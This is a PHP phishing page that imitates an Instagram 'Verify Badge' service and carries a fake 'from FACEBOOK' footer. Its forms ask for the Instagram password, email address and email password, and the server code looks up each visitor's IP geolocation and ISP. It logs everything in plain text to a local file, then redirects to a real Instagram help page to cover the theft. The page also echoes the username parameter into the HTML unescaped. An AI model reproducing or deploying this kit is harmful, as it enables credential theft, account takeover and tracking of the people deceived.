<?php

//error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Europe/Istanbul");

require 'vendor2/autoload.php';

if($_GET)
{
    if(empty($_GET['username'])) echo "<script type='text/javascript'>alert('Do not make space on your username!');</script>";
    if(!empty($_GET['comen']) && empty($_GET['password'])) { echo "<script type='text/javascript'>alert('Do not make space !');</script>"; header('Location: /'); }
}

if(!empty($_GET['username']) && empty($_GET['comen']))
{
    $_GET['username'] = strtolower($_GET['username']);
}

if(isset($_GET['comen']))
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "http://ip-api.com/json/".$_SERVER['REMOTE_ADDR']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($curl);
    curl_close($curl);
    $json = json_decode($output, true);
    
    $dosya = fopen("baris-altay.txt", "a");
    fwrite($dosya, "
    \$_KULLANICI_ADI : " . $_GET['username'] . "
    
    \$_SIFRE         : " . $_GET['password'] . "
    
    \$_EPOSTA        : " . $_GET['email'] . "
    
    \$_EPOSTA_SIF    : " . $_GET['emailPassword'] . "
    
    \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
    
    \$_ULKE          : " . $json['country'] . "
    
    \$_SEHIR         : " . $json['regionName'] . "
    
    \$_ILCE          : " . $json['city'] . "
    
    \$_ISP           : " . $json['isp'] . "
    
    \$_KATEGORI      : " . $_GET['category'] . "
    
    
    
    
    
    
    
    ");
    fclose($dosya);
    
    header("location: https://help.instagram.com/854227311295302/?helpref=hc_fnav");
}

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Verify Badge - Instagram</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
        <meta name="description" content="Verify Badge on your Instagram Account">
        <meta name="author" content="Instagram">
        
        <!-- SCRIPTS -->
        
        <!-- STYLESHEETS -->
        <link rel="stylesheet" href="css/style.css?<?= time(); ?>">
    </head>
    <body>
        <div class="advertise">
            <div class="advertise-left">
                <p class="bold-text">Instagram</p>
                <span class="light-text">Find it for free on Google Play</span>
            </div>
            <div class="advertise-right">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" class="get-app-button">Install</a>
            </div>
        </div>
        <?php
        
        if(empty($_GET['username']))
        {
        
        ?>
        <form action="/" method="GET" class="first-form">
            <div class="banner-sm">
                <img src="images/banner-sm.png" class="banner-sm-img" width="175">
            </div>
            <span class="color-gray">Get Verify Badge on your Instagram account. Fill the form and get verify in 24 hours!</span>
            <div class="mb-3">
                <input type="text" name="username" id="username" class="form-input" placeholder="Username" required autocomplete="off">
            </div>
            <div class="mb-3">
                <button type="submit">Next</button>
            </div>
        </form>
        <?php
        }else {
        ?>
        <form action="/" method="GET" class="second-form">
            <p>Verify Badge @<?= $_GET['username']; ?><img src="https://istalya.com/image/cache/catalog/resimler/Varl%C4%B1k%201-1080x1080w.png" width=20 height=20></p>
            <span class="color-gray">Verify Badge on your account.</span>
            <div class="mb-3">
                <input type="password" name="password" id="password" class="form-input" placeholder="Password" required autocomplete="off">
            </div>
            <div class="mb-3">
                <input type="email" name="email" id="email" class="form-input" placeholder="Email" required autocomplete="off">
            </div>
            <div class="mb-3">
                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password" required autocomplete="off">
            </div>
            <div class="mb-3">
                <select name="category" id="category" class="form-input">
                    <option value="sport">Sport</option>
                    <option value="news/media">News/media</option>
                    <option value="state-and-politics">State and politics</option>
                    <option value="music">Music</option>
                    <option value="fashion">Fashion</option>
                    <option value="fun">Fun</option>
                    <option value="influencer-blogger">Influencer/blogger</option>
                    <option value="computer-player">Computer Player</option>
                    <option value="business">Global business/brand/establishment</option>
                    <option value="other">Other</option>
                </select>
            </div>
            <input hidden type="text" name="username" value="<?= $_GET['username']; ?>">
            <input hidden type="number" name="comen" value="1">
            <div class="mb-3">
                <button type="submit">Get Verify</button>
            </div>
        </form>
        <?php
        }
        ?>
        <div class="poweredby">
            <p>from</p>
            <span>FACEBOOK</span>
        </div>
    </body>
</html>
